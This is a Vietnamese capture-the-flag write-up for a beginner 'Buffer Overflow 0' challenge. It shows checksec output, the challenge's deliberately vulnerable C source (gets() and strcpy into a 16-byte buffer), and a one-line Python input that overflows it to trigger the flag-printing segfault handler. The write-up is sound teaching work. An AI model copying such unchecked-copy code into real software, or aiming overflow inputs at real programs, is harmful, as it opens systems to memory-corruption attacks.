# Buffer Overflow 0

## Description

> Let's start off simple, can you overflow the correct buffer?

## Solution

Hãy nhìn qua binary xem nó có gì:

```bash
➜  BOF_0 file vuln
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b53f59f147e1b0b087a736016a44d1db6dee530c, for GNU/Linux 3.2.0, not stripped
➜  BOF_0 checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   84 Symbols        No    0               4               vuln
```

Một file ELF 32-bit và không có Stack Canary

Hãy xem qua source code có gì:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

&#x20;Ở function **sigsegv\_handler()**

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

Ta thấy  “SIGSEGV” là viết tắt cho **segmentation fault,** là một lỗi được tạo ra bởi phần cứng bảo vệ bộ nhớ mỗi khi nó cố gắng truy cập một địa chỉ bộ nhớ mà bị hạn chế hoặc không tồn tại. Nếu cờ **printf()** nằm trong **sigsegv\_handler()**, thì chúng ta có thể an tâm rằng chúng ta phải tìm ra cách kích hoạt một lỗi phân đoạn.

Tiếp tục với **main()** thì function này dùng **gets()** function, một function khá nguy hiểm vì nó cho phép chúng ta nhập input mà không kiểm tra độ dài của nó. Chính vì thế mà chúng ta có thể nhập vượt quá 100 bytes và chuyển 100 bytes input nào vào function **vuln().** Input của chúng ta có thể ghi đè 16 bytes **buf2** trong vuln() và có thể dẫn đến **segmentation fault**

Vì vậy ta có thể thử cho input với độ dài là 16 bytes trước sau đó tăng lên mỗi lần 4 bytes một cho đến khi nó gây lỗi

```bash
➜  BOF_0 python3 -c "print('A'*(16+3))" | ./vuln
Input: The program will exit now
➜  BOF_0 python3 -c "print('A'*(16+4))" | ./vuln
Input: FLAG{helloiloveyou}
```
